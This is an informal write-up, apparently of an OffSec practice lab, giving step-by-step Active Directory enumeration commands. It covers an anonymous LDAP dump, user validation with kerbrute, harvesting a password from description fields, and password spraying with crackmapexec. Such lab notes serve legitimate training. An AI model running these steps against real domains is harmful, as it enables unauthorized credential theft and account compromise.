Basically all active directory machine used LDAP port
And LDAP port is used for save the information about system .
Now first we try to find out information about system using ldabsearch tool

1. ldapsearch -x -h *targetIP* -b "dc=hutch,dc=offsec" > targetinfo.txt

2. cat targetinfo.txt | grep -i "samaccountname"

Copy the all users and save to users.txt
Next tool used for kerbrute and kerbrute used for identification of valid users 

3. kerbrute -domain <target.domain> -users ./users.txt -dc-ip  <targetIP>

Now you see who user is valid I think all users is valid if any user are invalid then it's great you identify the fake user and remove the fake user from users.txt

4. cat targetinfo.txt | grep -i "discription"

See all discriptions with full mind use and now you see password and copy the password and save pass.txt
Now we have a pass but we don't know which user pass so, let's identify which user pass.

5. crackmapexec smb <targetIP> -u ./users.txt -p ./pass.txt --continue-on-success

I use continue on success function for if pass valid for two users then great for we but we find a only one users pass it's ok 

Now we have a localusername and pass now continue active Directory notes part 2
